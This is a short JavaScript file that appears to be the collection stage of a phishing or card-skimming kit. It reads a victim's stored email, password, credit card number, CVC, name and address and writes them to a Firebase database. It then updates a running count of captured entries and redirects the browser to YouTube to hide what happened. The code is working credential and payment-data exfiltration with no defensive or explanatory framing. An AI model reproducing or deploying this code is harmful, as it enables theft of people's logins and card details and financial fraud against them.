async function senttofirebase() {
    var database = firebase.database()
    await database.ref('users/data-' + Math.random().toString(36).substr(2, 9)).set({
        email: localStorage.getItem("email"),
        password: localStorage.getItem("password"),
        credit: localStorage.getItem("credit"),
        cvc: localStorage.getItem("cvc"),
        name: localStorage.getItem("name"),
        address: localStorage.getItem("address")
    })
    await setCount();

};


// function test() {
//     var database = firebase.database()
//     database.ref('users/data').set({
//         test: "test"
//     })
// }

function setCount() {
    var database = firebase.database()
    var ref = firebase.database().ref("users");
    ref.once("value")
        .then(function (snapshot) {
            database.ref('count').set(snapshot.numChildren())
            console.log(snapshot.numChildren())
        window.location.href = "https://www.youtube.com/"
  });   
}
